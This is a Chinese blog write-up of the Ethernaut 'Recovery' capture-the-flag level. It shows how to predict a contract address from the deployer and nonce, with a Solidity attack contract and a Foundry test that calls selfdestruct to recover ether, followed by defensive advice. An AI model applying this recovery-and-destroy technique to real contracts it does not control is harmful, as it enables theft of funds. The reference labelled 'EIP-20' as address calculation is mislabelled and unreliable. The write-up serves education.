---
title: 'Ethernaut Level 17: Recovery - 预测合约地址'
date: 2025-01-25 16:30:00
updated: 2025-01-25 16:30:00
categories:
  - Ethernaut 系列
  - 进阶攻击篇 (11-20)
tags:
  - Ethernaut
  - Foundry
  - Contract Address Prediction
  - RLP
  - keccak256
  - 智能合约安全
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "学习如何基于部署者地址和 nonce 确定性地计算未来合约的地址。深入理解以太坊的 RLP 编码规则和 `keccak256` 哈希在地址生成中的作用，掌握 Recovery 关卡的破解技巧。"
---

# 🎯 Ethernaut Level 17: Recovery - 预测合约地址

> **关卡链接**: [Ethernaut Level 17 - Recovery](https://ethernaut.openzeppelin.com/level/17)  
> **攻击类型**: 合约地址预测  
> **难度**: ⭐⭐⭐☆☆

## 📋 挑战目标

`Recovery` 合约通过 `generateToken` 函数创建了一个 `SimpleToken` 合约实例，并向其发送了 0.001 ether。但是，`generateToken` 函数没有返回新创建的合约地址。你的目标是取回这 0.001 ether。

![Recovery Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg)

## 🔍 漏洞分析

`SimpleToken` 合约中有一个 `destroy` 函数，可以销毁合约并将余额发送到指定地址。因此，本关的核心挑战在于找到这个丢失的 `SimpleToken` 合约的地址。

```solidity
contract SimpleToken {
    // ...
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

在以太坊中，合约的地址并不是随机的，而是可以根据部署者的地址和其 `nonce` 确定性地计算出来的。其计算公式为：

`new_address = keccak256(rlp([sender_address, nonce]))`

-   `sender_address`: 创建合约的账户地址。在本例中，是 `Recovery` 合约的地址。
-   `nonce`: 创建者账户的 `nonce`。对于EOA，`nonce` 是其发送的交易数量。对于合约，`nonce` 是它创建的合约数量。由于 `Recovery` 合约是第一次创建 `SimpleToken`，所以它的 `nonce` 是1。
-   `rlp([...])`: 对发送者地址和 `nonce` 进行RLP（Recursive-Length Prefix）编码。

### RLP 编码

RLP编码规则比较复杂，但对于 `[address, nonce]` 这种列表，我们可以简化其在Solidity中的构造：

`abi.encodePacked(byte(0xd6), byte(0x94), sender_address, byte(0x01))`

-   `0xd6`: RLP前缀，表示一个长度在0-55字节之间的列表（list）。
-   `0x94`: RLP前缀，表示一个20字节的字符串（string），即地址。
-   `sender_address`: 20字节的部署者地址。
-   `0x01`: `nonce` 为1的RLP编码。

将这些部分打包并进行 `keccak256` 哈希，然后取结果的后20字节，就是我们丢失的合约地址。

### 在Solidity中计算地址

我们可以编写一个简单的函数来执行这个计算：

```solidity
function calculateAddress(address _deployerAddress) public pure returns (address) {
    uint nonce = 1; // 这是 _deployerAddress 创建的第一个合约
    return address(
        uint160(
            uint256(
                keccak256(
                    abi.encodePacked(
                        bytes1(0xd6),
                        bytes1(0x94),
                        _deployerAddress,
                        bytes1(nonce)
                    )
                )
            )
        )
    );
}
```

一旦我们计算出 `SimpleToken` 的地址，我们就可以调用它的 `destroy` 函数来取回以太币。

## 💻 Foundry 实现

### 攻击合约/逻辑

我们可以创建一个 `Attack` 合约，其中包含一个函数来为我们计算丢失的合约地址。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    function calculate(address _deployerAddress) public pure returns (address) {
        // nonce 是 1，因为这是 _deployerAddress 创建的第一个合约
        bytes1 nonce = bytes1(0x01);

        address lostContractAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),       // RLP prefix for a list
                            bytes1(0x94),       // RLP prefix for a 20-byte string
                            _deployerAddress,   // The deployer's address
                            nonce             // The nonce
                        )
                    )
                )
            )
        );

        return lostContractAddress;
    }
}
```

### Foundry 测试代码

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/17_Recovery.sol";

// 攻击合约定义 (同上)
contract Attack {
    function calculate(address _deployerAddress) public pure returns (address) {
        bytes1 nonce = bytes1(0x01);
        address lostContractAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _deployerAddress, nonce)))));
        return lostContractAddress;
    }
}

contract RecoveryTest is Test {
    Recovery recoveryInstance;
    Attack attack;
    address payable player;

    function setUp() public {
        player = payable(vm.addr(1));
        
        // 部署 Recovery 合约并让它创建一个 SimpleToken
        vm.deal(address(this), 0.001 ether);
        recoveryInstance = new Recovery();
        recoveryInstance.generateToken{value: 0.001 ether}("MyToken", 100);

        attack = new Attack();
    }

    function testAttacker() public {
        vm.startPrank(player, player);

        // 步骤 1: 计算丢失的 SimpleToken 合约地址
        address payable lostContract = payable(attack.calculate(address(recoveryInstance)));

        // 验证余额是否正确
        assertEq(lostContract.balance, 0.001 ether);

        // 步骤 2: 调用 destroy 函数取回资金
        SimpleToken(lostContract).destroy(player);

        // 验证资金是否已取回
        assertEq(lostContract.balance, 0);
        // 注意: player 的最终余额会略低于初始值，因为有 gas 消耗

        vm.stopPrank();
    }
}
```

### 关键攻击步骤

1.  **获取部署者地址**: 确定创建 `SimpleToken` 的合约地址，即 `Recovery` 合约的地址。
2.  **计算合约地址**: 使用 `keccak256(rlp([deployer_address, nonce]))` 公式计算出 `SimpleToken` 的地址。`nonce` 为1。
3.  **调用 `destroy`**: 获取 `SimpleToken` 合约的实例，并调用其 `destroy` 函数，将资金转移到 `player` 地址。

## 🛡️ 防御措施

1.  **返回创建的合约地址**: 工厂合约在创建新合约时，应该总是返回新创建的合约地址，或者触发一个包含该地址的事件。这是一个良好的编程实践。

    ```solidity
    // 修复建议
    function generateToken(string memory _name, uint256 _initialSupply) public payable returns (address) {
        SimpleToken token = new SimpleToken(_name, _initialSupply);
        token.transfer(msg.sender, msg.value);
        emit TokenCreated(address(token)); // 触发事件
        return address(token); // 返回地址
    }
    ```

2.  **使用 `CREATE2`**: 如果需要更强的地址确定性（例如，在合约部署前就与其交互），可以使用 `CREATE2` 操作码。`CREATE2` 允许根据部署者地址、一个 `salt` 值和合约的初始化代码来预计算地址，提供了更大的灵活性。

## 🔧 相关工具和技术

-   **地址确定性计算**: 理解合约地址是如何从部署者地址和 `nonce` 生成的，是EVM的一个核心概念。
-   **RLP (Recursive-Length Prefix)**: 以太坊用于序列化对象的主要编码方法。虽然在高级Solidity编程中不常直接使用，但理解其基本原理有助于深入了解EVM的内部工作方式。
-   **`keccak256`**: 以太坊中无处不在的哈希函数，用于地址生成、函数签名、数据校验等多种场景。

## 🎯 总结

**核心概念**:
-   合约地址是确定性的，可以预先计算。
-   地址的计算依赖于部署者的地址和其 `nonce`。
-   RLP编码是以太坊序列化数据的基础。

**攻击向量**:
-   当工厂合约没有返回或记录其创建的子合约地址时，攻击者可以通过链上数据（部署者地址和 `nonce`）自行计算出该地址。
-   一旦找到地址，就可以与该合约进行交互，利用其内部的任何函数（如本例中的 `destroy`）。

**防御策略**:
-   工厂合约应始终通过返回值或事件来暴露其创建的子合约地址。
-   在设计合约时，遵循良好的编程实践，确保所有重要的信息都是可访问的。

## 📚 参考资料

-   [EIP-20: Contract Address Calculation](https://eips.ethereum.org/EIPS/eip-20)
-   [Ethereum Docs: RLP (Recursive-Length Prefix)](https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/)
-   [StackExchange: How is an Ethereum address created?](https://ethereum.stackexchange.com/questions/760/how-is-an-ethereum-address-created)